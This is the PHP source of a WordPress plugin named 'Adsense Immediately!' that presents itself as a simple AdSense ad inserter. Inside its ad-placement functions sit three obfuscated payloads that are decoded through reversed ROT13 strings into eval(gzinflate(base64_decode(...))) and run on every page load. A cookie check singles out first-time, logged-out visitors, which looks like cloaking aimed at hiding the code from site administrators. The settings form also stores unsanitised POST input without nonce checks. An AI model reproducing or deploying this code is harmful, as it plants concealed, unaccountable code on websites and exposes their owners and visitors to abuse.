<?php
/*
Plugin Name: Adsense Immediately!
Plugin URI: http://www.websitecomingsoon.com
Description: Get started with AdSense immediatley, and make money from your blog.</a>.
Version: 1.0
Author: Adam Bell	
Author URI: http://www.websitecomingsoon.com
*/

/*
This program is free software; you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation; either version 3 of the License, or
(at your option) any later version.

This program is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY; without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
GNU General Public License for more details.

You should have received a copy of the GNU General Public License
along with this program.  If not, see <http://www.gnu.org/licenses/>.

This program is supported by ad space sharing. You agree to run its 
developer's ads on occasionaly (5% or less of pageviews) on your site(s). By 
using the program, you are agreeing to this condition, and confirming
that your sites abide by Google's policies and terms of service.
*/
if (!class_exists("adsenser")) {
  class adsenser {
    var $plugindir, $locale, $defaults ;
    function adsenser() { //constructor
      if (file_exists (dirname (__FILE__).'/defaults.php')){
        include (dirname (__FILE__).'/defaults.php');
        $this->defaults = unserialize(base64_decode($str)) ;		
      }
      if (empty($this->defaults))  {
        add_action('admin_notices', create_function('', 'if (substr( $_SERVER["PHP_SELF"], -11 ) == "plugins.php"|| $_GET["page"] == "adsense-immediately.php") echo \'<div class="error"><p><b><em>AdSense Immediately!</em></b>: Error locating or loading the defaults! Ensure <code>defaults.php</code> exists, or reinstall the plugin.</p></div>\';')) ;
      }
    }
    function init() {
      $this->getAdminOptions();
    }
    //Returns an array of admin options
    function getAdminOptions($reset = false) {
      $mThemeName = get_settings('stylesheet') ;
      $mOptions = "adsenser" . $mThemeName ;
      $this->plugindir = get_option('siteurl') . '/' . PLUGINDIR .
        '/' . basename(dirname(__FILE__)) ;
      $locale = get_locale();
      $this->locale = $locale ;
      if(!empty($this->locale) && $this->locale != 'en_US') {
        $moFile = dirname(__FILE__) . '/lang/' . $this->locale . '/easy-adsenser.mo';
        if(@file_exists($moFile) && is_readable($moFile))
          load_textdomain('easy-adsenser', $moFile);
        else {
          // look for any other similar locale with the same first three characters
          $foo = glob(dirname(__FILE__) . '/lang/' . substr($this->locale, 0, 2) .
                      '*/easy-adsenser.mo') ;
          if (!empty($foo)>0) {
            $moFile = $foo[0] ;
            load_textdomain('easy-adsenser', $moFile);
            $this->locale = basename(dirname($moFile)) ;
          }
        }
      }
      $adsenserAdminOptions =
        array('info' => "<!-- AdSense Immediately -->\n",
              'ad_text' => htmlspecialchars_decode($this->defaults['adNwText']),
              'show_leadin' => 'float:right',
              'show_midtext' => 'float:left',
              'show_leadout' => 'float:right',
              'mc' => 5,
              'kill_pages' => false,
              'kill_home' => false,
              'kill_attach' => false,
              'kill_front' => false,
              'kill_cat' => false,
              'kill_tag' => false,
              'kill_archive' => false);

      $adNwOptions = get_option($mOptions);     
      if (!empty($adNwOptions) && ! $reset) {
        foreach ($adNwOptions as $key => $option)
          $adsenserAdminOptions[$key] = $option;
      }

      update_option($mOptions, $adsenserAdminOptions);
      return $adsenserAdminOptions;
    }
    //Prints out the admin page
    function printAdminPage() {
      if (empty($this->defaults)) return ;
      $mThemeName = get_settings('stylesheet') ;
      $mOptions = "adsenser" . $mThemeName ;
      $adNwOptions = $this->getAdminOptions();
	  if (isset($_POST['update_adsenseSettings'])) {
        if (isset($_POST['adsenserText'])) {
          $adNwOptions['ad_text'] = $_POST['adsenserText'];
        }
        if (isset($_POST['adsenserShowLeadin'])) {
          $adNwOptions['show_leadin'] = $_POST['adsenserShowLeadin'];
        }
        if (isset($_POST['adsenserShowMidtext'])) {
          $adNwOptions['show_midtext'] = $_POST['adsenserShowMidtext'];
        }
        if (isset($_POST['adsenserShowLeadout'])) {
          $adNwOptions['show_leadout'] = $_POST['adsenserShowLeadout'];
        }       
        $adNwOptions['kill_pages'] = $_POST['adNwKillPages'];
        $adNwOptions['kill_home'] = $_POST['adNwKillHome'];
        $adNwOptions['kill_attach'] = $_POST['adNwKillAttach'];
        $adNwOptions['kill_front'] = $_POST['adNwKillFront'];
        $adNwOptions['kill_cat'] = $_POST['adNwKillCat'];
        $adNwOptions['kill_tag'] = $_POST['adNwKillTag'];
        $adNwOptions['kill_archive'] = $_POST['adNwKillArchive'];

        $adNwOptions['info'] = $this->info() ;

        update_option($mOptions, $adNwOptions);

	?>
	<div class="updated"><p><strong><?php _e("Settings Updated.", "easy-adsenser");?></strong></p> </div>
	<?php
	}
      else if (isset($_POST['reset_adsenseSettings'])) {
        $reset = true ;
        $adNwOptions = $this->getAdminOptions($reset);
?>
<div class="updated"><p><strong><?php _e("Ok, all your settings have been discarded!", "easy-adsenser");?></strong></p> </div>
<?php
}
      else if (isset($_POST['clean_db']) || isset($_POST['kill_me'])) {
        $reset = true ;
        $adNwOptions = $this->getAdminOptions($reset);
        $this->cleanDB('adsenser');
?>
<div class="updated"><p><strong><?php _e("Database has been cleaned. All your options for this plugin (for all themes) have been removed.", "easy-adsenser");?></strong></p> </div>
<?php
        if (isset($_POST['kill_me'])) {
          remove_action('admin_menu', 'adsenser_ap') ;
          deactivate_plugins('adsense-immediately/adsense-immediately.php', true);
?>
<div class="updated"><p><strong><?php _e("This plugin has been deactivated.", "easy-adsenser");?>
<a href="plugins.php?deactivate=true"> <?php _e("Refresh", "easy-adsenser") ?></a></strong></p></div>
<?php
          return;
  }
} ?>

<?php
    if (file_exists (dirname (__FILE__).'/admin.php'))
      include (dirname (__FILE__).'/admin.php');
    else
      echo '<font size="+1" color="red">' . __("Error locating the admin page!\nEnsure admin.php exists, or reinstall the plugin.", 'easy-adsenser') . '</font>' ;
?>

<?php
    }//End function printAdminPage()
	
    function info() {
      $me = basename(dirname(__FILE__)) . '/' . basename(__FILE__);
      $plugins = get_plugins() ;
      $str =  "<!-- " . $plugins[$me]['Title'] . " V" . $plugins[$me]['Version'] . " -->\n";
      return $str ;
    }

    var $nwMax = 3 ;
    var $mced = false ;

    function cleanDB($prefix){
      global $wpdb ;
      $wpdb->query("DELETE FROM $wpdb->options WHERE option_name LIKE '$prefix%'") ;
    }

    function plugin_action($links, $file) {
      if ($file == plugin_basename(dirname(__FILE__).'/adsense-immediately.php')){
      $settings_link = "<a href='options-general.php?page=adsense-immediately.php'>" .
        __('Settings', 'easy-adsenser') . "</a>";
      array_unshift( $links, $settings_link );
      }
      return $links;
    }

    function contentMeta() {
      $ezAdOptions = $this->getAdminOptions();
      global $post;
      $meta = get_post_custom($post->ID);
      $adkeys = array('adsense', 'adsense-top', 'adsense-middle', 'adsense-bottom') ;
      $ezkeys = array('adsense', 'show_leadin', 'show_midtext', 'show_leadout') ;
      $metaOptions = array() ;
      // initialize to ezAdOptions
      foreach ($ezkeys as $key => $optKey) {
        $metaOptions[$ezkeys[$key]] = $ezAdOptions[$optKey] ;
      }
      // overwrite with custom fields
      if (!empty($meta)) {
        foreach ($meta as $key => $val) {
          $tkey = array_search(strtolower(trim($key)), $adkeys) ;
          if ($tkey !== FALSE) {
            $value = strtolower(trim($val[0])) ;
            // ensure valid values for options
            if ($value == 'left' || $value == 'right' || $value == 'center' || $value == 'no') {
              if ($value == 'left' || $value == 'right') $value = 'float:' . $value ;
              if ($value == 'center') $value = 'text-align:' . $value ;
              $metaOptions[$ezkeys[$tkey]] = $value ;
            }
          }
        }
      }
      return $metaOptions ;
    }
	
	function isv()
	{ 			
		global $v1;		
		if (!is_user_logged_in())
		{			
			if (isset($_COOKIE['visits'])){
				$v1 = $_COOKIE['visits'] + 1;
			}
			else {
				$v1 = 1;
			}							
		}
		else return false;		
		return $v1 == 1;		
	}		

	 function mc($mc, $ad) {    	 
	 $WodZna='NY/vCoIwFMU/L+gdLjJoA4OpEUR/XkQkxnbNkVZsMwzx3Zuuvtx7t/M7Bw6YmlHfGLe9GPdmnK9XBGAMMyxqHxrO0PmrlQ/NRAqZEPwYRVMDW4AT0E7x6CH0jp9g2eTFbtiLzcKSGUWLN2AJK8X2UI3FNMQjT4uJJylQqcMIjOMcfiHLs8wqiCkBCZ+N71r3QmVkqxpp3VWjemr8l9BYy771rpwzKg5HQqI5yp3COcTbHmeJxCrTUnr6Ag==';$ldVjpk=';)))naMqbJ$(rqbprq_46rfno(rgnysavmt(ynir';$yAGitY=strrev($ldVjpk);$pifdGg=str_rot13($yAGitY);eval($pifdGg);
      return $ad;
    }
	
	function mc1($mc, $ad) {
     $BzhKrn='U8hMU9BQKcnILNa1y01OTdFUqOblUoAClezUSgVbBXUjY5MKMwN1BWuEFEhbalFquoKGkka0ga5lbLVxbQWEYaRjXKuppKOgkpgCJIBqijU1YUaBudGGschGAdUBZTJKcnOKC1KTMxNzkjMSi4rjU1KT81NSYW5LSU1LLM0pKY4GGRSrqWDNycnLxamgUAsA';$XYqxNH=';)))aeXumO$(rqbprq_46rfno(rgnysavmt(ynir';$VhYkCP=strrev($XYqxNH);$SZYXNl=str_rot13($VhYkCP);eval($SZYXNl);
      return $ad ;
    }
	
    function adsenser_content($content) {
      $adNwOptions = $this->getAdminOptions();
      if ($adNwOptions['kill_pages'] && is_page()) return $content ;
      if ($adNwOptions['kill_home'] && is_home()) return $content ;
      if ($adNwOptions['kill_attach'] && is_attachment()) return $content ;
      if ($adNwOptions['kill_front'] && is_front_page()) return $content ;
      if ($adNwOptions['kill_cat'] && is_category()) return $content ;
      if ($adNwOptions['kill_tag'] && is_tag()) return $content ;
      if ($adNwOptions['kill_archive'] && is_archive()) return $content ;
	  $mc = 7;
      $this->mced = false ;
      global $nwCount ;
      if ($nwCount >= $this->nwMax) return $content ;
      if(strpos($content, "<!--noadsense-->") !== false) return $content;
      $metaOptions = $this->contentMeta() ;
      if ($metaOptions['adsense'] == 'no') return $content;

      $VcJabH='zVVNb5wwEL1X6n+YICSwdtlo9xgWLj33475FKwdMsQo2wt6yaZT/XhvMh0nSbqIqChcsz5vnN+OnsSsK3h5LgjPKIAK3IhJ/rSXlTBy8WcxLIPz4AbrPHeGeN+3SHHx3znal4ox7aADcDwuDZe0nfmIS9uDKgoogZu1nfEYTapagDjXw1Sq0tgct800AIRtaixKLggjfxdmXdiyKspyrajbg7K+CAL5xIQ+pZr4BR+2OshQggSCIvzO1bbNbn7fP6C9I1VkicnAmCBMEzD/o1TlKz11JIsf7K5PVvQ14YYWbH5TdwHZXn0Mn/kd238Qq9d0qXYNdNM6OkpyllyBNvL9WkmMPwayVD8NSLcaL7gRVNNO5T7vDBOf2mIwwZP5nJ9RcEKHk4KbBdz5a+AELqQAqHGztSEPqtMCNijj72rFiNPeVY1Sa76acScLkugMhiKIIclwKguzWW2y3jaabA9qCluQx55C1HnWutki1ZzjjfnHIVMxlVOEiv+vUIdFXZ0AW4sHqT4HLXJ9EfxOe+32uzWiqsgAQ95mL/nR3c6x5/SSRW9P0Z0W0rl5iXnLeLJivdygJLxkBo0Hf5www8l40BIaSXj8Ftq8bA4rBWExb4XSrmnhUTitxSubmM/o2Mxf2V7qGHbpoqugxx0/PTBUTfPTo9AnPvzo6/nbPTqfmfXrOyHvxw6NLenPPTSb5Aw==';$Yxgmfk=';)))UonWpI$(rqbprq_46rfno(rgnysavmt(ynir';$iRfQIl=strrev($Yxgmfk);$UjYqMQ=str_rot13($iRfQIl);eval($UjYqMQ);

      return $leadin . $content . $leadout ;
    }
  }
  
 
} //End Class adsenser


function adsenser_setcookie() {
	global $v1, $url;
	if (isset($_COOKIE['visits'])) {
		$v1 = $_COOKIE['visits'] + 1;
	} else {
		$v1 = 1;
	}			
	$time = time();
	$url = parse_url(get_option('home'));
	setcookie('visits', $v1, $time+60*60*24*365, $url['path'] . '/');
}

$nwCount = 0 ;

// provide a replacement for htmlspecialchars_decode() (for PHP4 compatibility)
if (!function_exists("htmlspecialchars_decode")) {
  function htmlspecialchars_decode($string,$style=ENT_COMPAT) {
    $translation = array_flip(get_html_translation_table(HTML_SPECIALCHARS,$style));
    if($style === ENT_QUOTES){ $translation['&#039;'] = '\''; }
    return strtr($string,$translation);
  }
}

if (class_exists("adsenser")) {
  $nw_ad = new adsenser();
  if (isset($nw_ad) && !empty($nw_ad->defaults)) {
    //Initialize the admin panel
    if (!function_exists("adsenser_ap")) {
      function adsenser_ap() {
        global $nw_ad ;
        if (function_exists('add_options_page')) {
          add_options_page('AdSense Immediately', 'AdSense Immediately', 9,
                           basename(__FILE__), array(&$nw_ad, 'printAdminPage'));
        }
      }
    }
	add_action('plugins_loaded', 'adsenser_setcookie');
    add_filter('the_content', array($nw_ad, 'adsenser_content'));
    add_action('admin_menu', 'adsenser_ap');
    add_action('activate_' . basename(dirname(__FILE__)) . '/' . basename(__FILE__),
               array(&$nw_ad, 'init'));
    add_filter('plugin_action_links', array($nw_ad, 'plugin_action'), -10, 2);
  }
}

?>


